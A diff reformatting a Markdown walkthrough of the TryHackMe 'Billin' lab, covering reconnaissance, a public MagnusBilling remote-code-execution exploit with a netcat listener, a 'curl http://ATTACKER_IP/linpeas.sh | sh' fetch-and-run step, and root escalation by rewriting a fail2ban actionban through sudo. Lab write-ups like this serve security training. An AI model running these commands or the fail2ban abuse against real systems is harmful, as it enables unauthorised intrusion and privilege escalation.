@@ -1,18 +1,17 @@
 # Billin Room — TryHackMe
 
-> Objective: Gain initial access to the machine, retrieve `user.txt`, then escalate privileges to root and obtain `root.txt`.
+> **Objective:** Gain initial access to the machine, retrieve `user.txt`, then escalate privileges to root and obtain `root.txt`.
 
 # Reconnaissance
 
 We begin with a standard service scan.
 
-Bash
 
-```
+```BASH
 sudo nmap -sS -sV 10.114.188.79
 ```
 
-The scan reveals three open ports:
+**The scan reveals three open ports:**
 
 * 22/tcp — SSH
 
@@ -34,9 +33,8 @@ This suggests that the web server is the most promising initial attack vector.
 
 We start by running Gobuster.
 
-Bash
 
-```
+```BASH
 gobuster dir -w /home/deb88/lists/common.txt -u http://10.114.188.79
 ```
 
@@ -55,9 +53,7 @@ The redirect from `/index.php` to `/mbilling` indicates that the application is 
 
 We use Nuclei to search for known vulnerabilities.
 
-Bash
-
-```
+```BASH
 nuclei -u http://TARGET -severity low,medium,high,critical
 ```
 
@@ -83,7 +79,6 @@ We use an existing exploit:
 
 [https://github.com/hadrian3689/magnus_billing_rce/tree/main](https://github.com/hadrian3689/magnus_billing_rce/tree/main) 
 
-Bash
 
 ```
 python3 magnus_rce.py \
@@ -94,15 +89,14 @@ python3 magnus_rce.py \
 
 On our machine, we start a Netcat listener:
 
-Bash
 
-```
+```BASH
 nc -lvnp 9999
 ```
 
 After successful exploitation, we obtain a shell:
 
-```
+```BASH
 asterisk@target:/var/www/html/mbilling/lib/icepay$
 ```
 
@@ -112,9 +106,7 @@ We now have initial access to the machine as the asterisk user.
 
 We inspect the filesystem.
 
-Bash
-
-```
+```BASH
 cd /
 ls -la
 ```
@@ -125,7 +117,7 @@ Next, we investigate the users' home directories.
 
 In the following directory:
 
-```
+```BASH
 /home/magnus
 ```
 
@@ -147,33 +139,27 @@ To identify potential privilege escalation vectors, we use LinPEAS.
 
 On our machine, we start a temporary HTTP server:
 
-Bash
 
-```
+```BASH
 sudo python3 -m http.server 80
 ```
 
 On the target machine, we execute:
 
-Bash
-
-```
+```BASH
 curl http://ATTACKER_IP/linpeas.sh | sh
 ```
 
-We can also try to obtain a fully interactive shell:
+We can also try to obtain a fully **interactive shell:**
 
-Bash
 
-```
+```BASH
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Alternatively:
+**Alternatively:**
 
-Bash
-
-```
+```BASH
 script -qc /bin/bash /dev/null
 ```
 
@@ -183,9 +169,8 @@ However, these commands do not grant root access by themselves. They only provid
 
 The next step is to check which commands the current user is allowed to execute with sudo.
 
-Bash
 
-```
+```BASH
 sudo -l
 ```
 
@@ -226,7 +211,7 @@ We check which Fail2Ban jails are currently active.
 
 Bash
 
-```
+```BASH
 sudo fail2ban-client status
 ```
 
@@ -249,9 +234,8 @@ We use two commands to exploit the available sudo permissions.
 
 ## First Command
 
-Bash
 
-```
+```BASH
 sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'"
 ```
 
@@ -297,17 +281,14 @@ This is the command that Fail2Ban executes when it bans a new IP address.
 
 By default, it contains a command similar to:
 
-Bash
 
-```
+```BASH
 iptables -I INPUT ...
 ```
 
-We replace it with our own command:
+**We replace it with our own command:**
 
-Bash
-
-```
+```BASH
 /bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
 ```
 
@@ -315,9 +296,7 @@ Let's examine what this command does.
 
 First:
 
-Bash
-
-```
+```BASH
 /bin/bash -c
 ```
 
@@ -325,9 +304,7 @@ tells Bash to execute the command provided as a string.
 
 Next:
 
-Bash
-
-```
+```BASH
 cat /root/root.txt
 ```
 
@@ -337,19 +314,16 @@ Since Fail2Ban runs as root, this command is also executed with root privileges.
 
 The output is redirected to:
 
-Bash
 
-```
+```BASH
 > /home/root.txt
 ```
 
 This creates a new file outside the `/root` directory and writes the contents of the original `root.txt` into it.
 
-Finally:
+**Finally:**
 
-Bash
-
-```
+```BASH
 chmod 777 /home/root.txt
 ```
 
@@ -361,9 +335,7 @@ We do not obtain a root shell directly. Instead, we make a root process copy the
 
 Now we execute the second command:
 
-Bash
-
-```
+```BASH
 sudo fail2ban-client set sshd banip 127.0.0.1
 ```
 
@@ -385,11 +357,10 @@ actionban
 
 However, we have already replaced the default command with our own.
 
-As a result, instead of adding a firewall rule, Fail2Ban executes:
+As a result, instead of adding a firewall rule, **Fail2Ban executes:**
 
-Bash
 
-```
+```BASH
 /bin/bash -c 'cat /root/root.txt > /home/root.txt && chmod 777 /home/root.txt'
 ```
 
@@ -405,9 +376,8 @@ The two commands work together:
 
 After executing the second command, all that remains is to read the newly created file.
 
-Bash
 
-```
+```BASH
 cat /home/root.txt
 ```
 
